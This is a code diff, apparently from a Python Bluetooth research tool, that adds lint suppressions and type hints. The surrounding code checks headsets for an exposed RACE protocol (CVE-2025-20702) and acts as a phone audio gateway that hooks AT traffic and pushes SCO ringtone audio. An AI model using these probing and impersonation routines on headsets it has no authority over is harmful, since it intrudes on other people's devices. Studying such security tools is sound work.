-            known_uuid = RFCOMMTransport._matches_any_known_uuid(service_info)
+            known_uuid = RFCOMMTransport._matches_any_known_uuid(  # pylint: disable=protected-access
+                service_info
+            )
             if known_uuid:
                 logging.info("             ^^^ RACE PROTOCOL EXPOSED! (CVE-2025-20702)")
     else:
@@ -7775,7 +7771,9 @@ async def command_hfp_demo(args: argparse.Namespace):
             ("packet_type", 2),
         ],
     )
-    class HCI_Setup_Synchronous_Connection_Command(HCI_Command):
+    class HCI_Setup_Synchronous_Connection_Command(  # pylint: disable=invalid-name
+        HCI_Command
+    ):
         """Legacy Setup Synchronous Connection Command (opcode 0x0428)."""
 
     controller = args.controller or "usb:0"
@@ -7992,7 +7990,7 @@ async def command_hfp_demo(args: argparse.Namespace):
         # Add packet-level logging by wrapping the DLC write
         original_write = dlc.write
 
-        def logged_write(data):
+        def logged_write(data: bytes | bytearray | str):
             if isinstance(data, bytes):
                 text = data.decode("utf-8", errors="replace").strip()
             else:
@@ -8003,9 +8001,9 @@ async def command_hfp_demo(args: argparse.Namespace):
         dlc.write = logged_write
 
         # Wrap the protocol's AT command reader to log incoming data
-        original_read_at = ag_protocol._read_at
+        original_read_at = ag_protocol._read_at  # pylint: disable=protected-access
 
-        def logged_read_at(data):
+        def logged_read_at(data: bytes | bytearray | str):
             if isinstance(data, bytes):
                 text = data.decode("utf-8", errors="replace").strip()
             else:
@@ -8013,8 +8011,8 @@ async def command_hfp_demo(args: argparse.Namespace):
             logging.debug("<<< RX (HF->AG): %s", repr(text))
             return original_read_at(data)
 
-        ag_protocol._read_at = logged_read_at
-        dlc.sink = ag_protocol._read_at
+        ag_protocol._read_at = logged_read_at  # pylint: disable=protected-access
+        dlc.sink = ag_protocol._read_at  # pylint: disable=protected-access
 
         logging.info("Waiting for headset to complete SLC handshake...")
         logging.info("(The headset sends AT commands, we respond automatically)")
@@ -8033,7 +8031,7 @@ async def command_hfp_demo(args: argparse.Namespace):
         def on_hang_up():
             logging.info(">>> HEADSET: User hung up the call!")
 
-        def on_dial(number):
+        def on_dial(number: str) -> None:
             logging.info(">>> HEADSET: User dialing %s", number)
 
         ag_protocol.on("slc_complete", on_slc_complete)
@@ -8343,7 +8341,7 @@ async def command_hfp_demo(args: argparse.Namespace):
                         # Use list to allow modification in closure
                         sco_handle = [None]
 
-                        def on_sco_connection(sco_link):
+                        def on_sco_connection(sco_link: object) -> None:
                             """Handle SCO connection complete event.
 
                             Args:
@@ -8358,7 +8356,7 @@ async def command_hfp_demo(args: argparse.Namespace):
                             sco_handle[0] = sco_link.handle
                             sco_connected.set()
 
-                        def on_sco_failure(error):
+                        def on_sco_failure(error: object) -> None:
                             """Handle SCO connection failure."""
                             logging.error("SCO setup failed: %s", error)
 
@@ -8464,7 +8462,7 @@ async def command_hfp_demo(args: argparse.Namespace):
                                         raise RuntimeError(
                                             "No SCO command supported by controller"
                                         )
-                                    elif legacy_params != 0:
+                                    if legacy_params != 0:
                                         logging.warning(
                                             "Legacy SCO setup returned: 0x%02X",
                                             legacy_params,
@@ -8515,11 +8513,13 @@ async def command_hfp_demo(args: argparse.Namespace):
                             # Standard phone ring: 440Hz + 480Hz (US dial tone style)
                             # or 425Hz (European style)
                             sample_rate = 8000
-                            duration_ms = 500  # Ring duration in ms
                             samples_per_packet = 60  # CVSD packet size
 
                             def generate_ringtone_samples(
-                                freq1, freq2, num_samples, offset
+                                freq1: float,
+                                freq2: float,
+                                num_samples: int,
+                                offset: int,
                             ):
                                 """Generate dual-tone samples for ringtone."""
                                 samples = []
@@ -8535,7 +8535,7 @@ async def command_hfp_demo(args: argparse.Namespace):
                                     samples.append(sample)
                                 return samples
 
-                            def samples_to_bytes(samples):
+                            def samples_to_bytes(samples: list[int]) -> bytes:
                                 """Convert samples to little-endian 16-bit bytes."""
                                 result = bytearray()
                                 for s in samples:
@@ -8640,9 +8640,7 @@ async def command_hfp_demo(args: argparse.Namespace):
                         logging.info("-" * 60)
                     except Exception as e:  # pylint: disable=broad-exception-caught
                         logging.error("SCO audio setup failed: %s", e)
-                        import traceback as tb
-
-                        tb.print_exc()
+                        traceback.print_exc()
                 else:
                     logging.error(
                         "sco-ring is only available in AG role with headsets."
@@ -9154,7 +9152,7 @@ def run_main():
     # Set up a flag to track if we're shutting down
     shutdown_requested = False
 
-    def force_exit(signum, frame):
+    def force_exit(_signum: int, _frame: object | None) -> None:
         """Force exit on second Ctrl+C."""
         print("\n\033[1;31mForce exit.\033[0m")
         sys.exit(130)
